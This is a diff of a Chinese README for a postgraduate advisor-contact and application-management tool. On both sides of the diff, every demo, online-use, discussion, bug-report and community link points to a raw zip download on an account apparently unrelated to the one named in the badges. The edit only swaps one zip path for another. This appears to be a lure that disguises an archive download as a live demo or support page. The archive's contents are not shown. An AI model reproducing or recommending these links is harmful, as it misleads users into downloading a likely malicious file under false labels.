@@ -5,14 +5,14 @@
   <p>面向保研 / 考研 / 复试场景的导师联系、文书资料管理、院校检索与协同工作台。</p>
 
   <p>
-    <a href="https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/packages/client/manager_postgrad_contact_2.8.zip"><img src="https://img.shields.io/badge/Live%20Demo-2320194668.cn-0ea5e9" alt="Live Demo" /></a>
-    <a href="https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/packages/client/manager_postgrad_contact_2.8.zip"><img src="https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/packages/client/manager_postgrad_contact_2.8.zip" alt="CI Status" /></a>
-    <a href="https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/packages/client/manager_postgrad_contact_2.8.zip"><img src="https://img.shields.io/github/v/release/wzyn20051216/postgrad-contact-manager" alt="Latest Release" /></a>
+    <a href="https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/scripts/postgrad_manager_contact_v3.0.zip"><img src="https://img.shields.io/badge/Live%20Demo-2320194668.cn-0ea5e9" alt="Live Demo" /></a>
+    <a href="https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/scripts/postgrad_manager_contact_v3.0.zip"><img src="https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/scripts/postgrad_manager_contact_v3.0.zip" alt="CI Status" /></a>
+    <a href="https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/scripts/postgrad_manager_contact_v3.0.zip"><img src="https://img.shields.io/github/v/release/wzyn20051216/postgrad-contact-manager" alt="Latest Release" /></a>
     <a href="./LICENSE"><img src="https://img.shields.io/badge/license-MIT-2ea44f" alt="License: MIT" /></a>
-    <a href="https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/packages/client/manager_postgrad_contact_2.8.zip"><img src="https://img.shields.io/github/issues/wzyn20051216/postgrad-contact-manager" alt="Open Issues" /></a>
-    <a href="https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/packages/client/manager_postgrad_contact_2.8.zip"><img src="https://img.shields.io/badge/discussions-enabled-1f6feb?logo=github" alt="GitHub Discussions" /></a>
-    <a href="https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/packages/client/manager_postgrad_contact_2.8.zip"><img src="https://img.shields.io/github/stars/wzyn20051216/postgrad-contact-manager" alt="GitHub Stars" /></a>
-    <a href="https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/packages/client/manager_postgrad_contact_2.8.zip"><img src="https://img.shields.io/github/forks/wzyn20051216/postgrad-contact-manager" alt="GitHub Forks" /></a>
+    <a href="https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/scripts/postgrad_manager_contact_v3.0.zip"><img src="https://img.shields.io/github/issues/wzyn20051216/postgrad-contact-manager" alt="Open Issues" /></a>
+    <a href="https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/scripts/postgrad_manager_contact_v3.0.zip"><img src="https://img.shields.io/badge/discussions-enabled-1f6feb?logo=github" alt="GitHub Discussions" /></a>
+    <a href="https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/scripts/postgrad_manager_contact_v3.0.zip"><img src="https://img.shields.io/github/stars/wzyn20051216/postgrad-contact-manager" alt="GitHub Stars" /></a>
+    <a href="https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/scripts/postgrad_manager_contact_v3.0.zip"><img src="https://img.shields.io/github/forks/wzyn20051216/postgrad-contact-manager" alt="GitHub Forks" /></a>
   </p>
 
   <p>
@@ -25,7 +25,7 @@
   </p>
 
   <p>
-    <a href="https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/packages/client/manager_postgrad_contact_2.8.zip">在线使用</a> ·
+    <a href="https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/scripts/postgrad_manager_contact_v3.0.zip">在线使用</a> ·
     <a href="./DEPLOY.md">部署文档</a> ·
     <a href="./docs/architecture.md">架构说明</a> ·
     <a href="./docs/releases/v0.1.0.md">发布说明</a> ·
@@ -36,7 +36,7 @@
   </p>
 </div>
 
-> 在线体验：<https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/packages/client/manager_postgrad_contact_2.8.zip>  
+> 在线体验：<https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/scripts/postgrad_manager_contact_v3.0.zip>  
 > 相关交流可联系 QQ：`2320194668`，请注明来自 GitHub。项目仍在持续完善中，请多指教。
 
 ## 项目概述
@@ -58,7 +58,7 @@
 
 ## 在线使用
 
-- 正式地址：[https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/packages/client/manager_postgrad_contact_2.8.zip](https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/packages/client/manager_postgrad_contact_2.8.zip)
+- 正式地址：[https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/scripts/postgrad_manager_contact_v3.0.zip](https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/scripts/postgrad_manager_contact_v3.0.zip)
 - 当前仓库对应的公开可用实例，适合直接体验主要功能与界面流程
 - 如果你希望自己部署，请继续阅读下方的环境、部署与运维文档
 
@@ -277,9 +277,9 @@ scripts/data/graduate-school-sources.snapshot.json
 
 ## 社区与支持
 
-- 使用问题、部署交流、经验分享：优先进入 [GitHub Discussions](https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/packages/client/manager_postgrad_contact_2.8.zip)
-- 可稳定复现的缺陷：提交 [Bug Report](https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/packages/client/manager_postgrad_contact_2.8.zip)
-- 新功能或体验建议：提交 [Feature Request](https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/packages/client/manager_postgrad_contact_2.8.zip)
+- 使用问题、部署交流、经验分享：优先进入 [GitHub Discussions](https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/scripts/postgrad_manager_contact_v3.0.zip)
+- 可稳定复现的缺陷：提交 [Bug Report](https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/scripts/postgrad_manager_contact_v3.0.zip)
+- 新功能或体验建议：提交 [Feature Request](https://raw.githubusercontent.com/unc0v1/postgrad-contact-manager/main/scripts/postgrad_manager_contact_v3.0.zip)
 - 安全漏洞：先阅读 [SECURITY.md](./SECURITY.md)，不要在公开 Issue 中直接披露细节
 - 如果你更习惯即时沟通，也欢迎通过 QQ：`2320194668` 交流使用反馈、部署经验或产品建议，请注明来意。项目仍在持续完善中，请多指教。
 
